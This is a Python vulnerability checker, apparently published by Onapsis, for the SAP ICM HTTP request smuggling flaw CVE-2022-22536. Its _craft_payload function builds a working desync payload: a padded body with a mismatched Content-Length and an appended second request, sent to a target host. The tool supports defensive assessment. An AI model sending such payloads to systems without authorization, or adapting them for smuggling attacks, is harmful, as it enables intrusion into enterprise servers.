#!/usr/bin/env python3
"""Author: Onapsis Inc.
Version: 1.0b
CVE: CVE-2022-22536
Vendor: SAP
SAP Security Note: 3123396
Component: ICM
"""
from argparse import ArgumentParser
import socket
import ssl
import re
import logging

METHOD = 'GET'
TEST_RESOURCES = ('/sap/admin/public/default.html?aaa',
                       '/sap/public/bc/ur/Login/assets/corbu/sap_logo.png')
RESPONSE_PATTERN = (r'(?P<version>HTTP/\S+) '
                    + r'(?P<status_code>\d{3}) '
                    + r'(?P<status_text>.+)'
                    + '\r\n')

logger = logging.getLogger(__name__)


def _setup_logger(level:int=logging.INFO):
    std_log_format = logging.Formatter('%(levelname)s - %(message)s')
    std_log_handler = logging.StreamHandler()
    std_log_handler.setFormatter(std_log_format)
    logger.setLevel(level)
    logger.addHandler(std_log_handler)


def _craft_ssl_context(cert_verify:bool=True) -> ssl.SSLContext:
    """Crafts the ssl context wrapper and sets verification options"""
    logger.debug('Setting SSL context with verify mode %s', cert_verify)
    context = ssl.SSLContext()
    # By default we check valid for cert security
    if cert_verify:
        context.verify_mode = ssl.CERT_REQUIRED
        context.check_hostname = True
        context.load_default_certs()
    else:
        context.verify_mode = ssl.CERT_NONE
        context.check_hostname = False
    return context


def _craft_socket(server_hostname:str=None, secure:bool=False,
                  cert_verify:bool=True) -> socket.socket:
    """Crafts the socket and wraps the ssl connection if it's required"""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    logger.debug('Crafting socket')
    if secure:
        context = _craft_ssl_context(cert_verify=cert_verify)
        logger.debug('Wraping socket with SSL')
        s = context.wrap_socket(s, server_hostname=server_hostname)
    return s


def _craft_payload(host:str, port:int,
                   method:str=METHOD, resource:str=None) -> bytes:
    """Crafts the required payload and the proxy aligment"""
    logger.debug('Crafting payload for %s:%s', host, port)
    action = '{method} {resource} HTTP/1.1'.format(
                method=method, resource=resource)
    host_header = 'Host: {host}:{port}'.format(host=host, port=port)
    padding = 'A' * 82642
    header_separator = '\r\n'
    content_separator = header_separator * 2
    # Proxy will match the amount of responses to the requests amounts
    proxy_alignment = 'GET / HTTP/1.1\r\nHost: {host}:{port}\r\n\r\n'\
                      .format(host=host, port=port)
    payload = (action
               + header_separator
               + host_header
               + header_separator
               + 'User-Agent: Onapsis\' ICM CVE-2022-22536 assess tool'
               + header_separator
               + 'Content-Length: 82646'
               + header_separator
               + 'Connection: keep-alive'
               + content_separator
               + padding
               + content_separator
               + proxy_alignment)
    return payload.encode()


def _parse_response(data:bytes) -> dict:
    """Encode and parse the responses"""
    enc_data = data.decode('utf-8', errors='replace')
    compiled_pattern = re.compile(RESPONSE_PATTERN)
    response_count = 0
    responses = []
    for r in compiled_pattern.finditer(enc_data):
        response_count += 1
        d = r.groupdict()
        responses.append(d)
    results = {
        'count': response_count,
        'total_size': len(data),
        'responses': responses
    }
    return results


def _validate_resource_and_cache(host:str, port:int,
            secure:bool=False, cert_verify:bool=False) -> str:
    """Performs requests to check and cache resources"""
    for r in TEST_RESOURCES:
        s = _craft_socket(server_hostname=host, secure=secure,
                      cert_verify=cert_verify)
        s.connect((host, port))
        logger.debug('Connection established %s:%s', host, port)
        logger.debug('Validating resource %s', r)
        payload = ('{method} {resource} HTTP/1.1\r\n'
                   + 'Host: {host}\r\n\r\n')
        payload = payload.format(method=METHOD, resource=r, 
                                 host=host, port=port)
        payload = payload.encode()
        data = _send_payload(s, host, port, payload)
        resp = _parse_response(data)
        if resp['count'] > 0 and resp['responses'][0]['status_code'] == '200':
            logger.debug('Resource %s seems valid', r)
            return r
        logger.debug(
            'Resource %s seems not valid. Status code %s', r,
            resp['responses'][0]['status_code'])
        s.close()
    return None


def _send_payload(s:socket.socket, host:str, port:int,
                  payload:bytes=None) -> bytes:
    s.send(payload)
    logger.debug('Payload sent')
    data = b''
    s.settimeout(3.0)
    try:
        while True:
            chunk = s.recv(1024)
            if not chunk:
                break
            data += chunk
    except socket.timeout:
        pass
    s.close()
    return data


def _execute(host:str, port:int, resource:str=None,
             secure:bool=False, cert_verify:bool=False) -> str:
    s = _craft_socket(server_hostname=host, secure=secure,
                      cert_verify=cert_verify)
    s.connect((host, port))
    logger.debug('Connection established %s:%s', host, port)
    payload = _craft_payload(host, port, resource=resource)
    data = _send_payload(s, host, port, payload)
    results = _parse_response(data)
    logger.debug('Response count: {}'.format(results['count']))
    _debug_responses(results['responses'])
    s.close()
    scp = re.compile(r'^(400|5[0-9]{2})$')
    return results['count'] > 1 and \
        scp.match(results['responses'][1]['status_code'])


def _debug_responses(responses:dict) -> None:
    for i, r in enumerate(responses):
        logger.debug(
            'Response %s: %s %s', i, r['status_code'], r['status_text'])


def main() -> None:
    """main execution path"""
    parser = ArgumentParser(prog="SAP ICM CVE-2022-22536 checker")
    parser.add_argument('-H', dest='host',
                        help="Domain or host to test", required=True)
    parser.add_argument('-P', dest='port',
                        help="ICM/Proxy port", required=True, type=int)
    parser.add_argument('--secure', help="Establish secure connection",
                        action='store_true', default=False)
    parser.add_argument('--no-verify-cert',
                        help="No verify SSL certs (insecure)",
                        dest='cert_verify', action='store_false', default=True)
    parser.add_argument('--debug', '-d', dest='debug',
                        action='store_true', default=False)
    args = parser.parse_args()
    if args.debug:
        log_level = logging.DEBUG
    else:
        log_level = logging.INFO
    _setup_logger(level=log_level)
    try:
        resource = _validate_resource_and_cache(args.host, args.port,
            secure=args.secure, cert_verify=args.cert_verify)
        if resource is not None:
            vulnerable = _execute(args.host, args.port, resource=resource,
                secure=args.secure, cert_verify=args.cert_verify)
            if vulnerable:
                logger.info('%s:%s vulnerable', args.host, args.port)
            else:
                logger.info('%s:%s not vulnerable', args.host, args.port)
        else:
            logger.error(
                'No valid resource test found, is not possible to test')
    except ssl.SSLError:
        logger.error(
            ('SSL error, provide --no-verify-cert '
             + 'for self signed certificates')
             )
    except ConnectionRefusedError as e:
        logger.error(e)
    except ConnectionResetError:
        logger.error('Connection reset by peer, provide --secure for ssl')


if __name__ == '__main__':
    main()
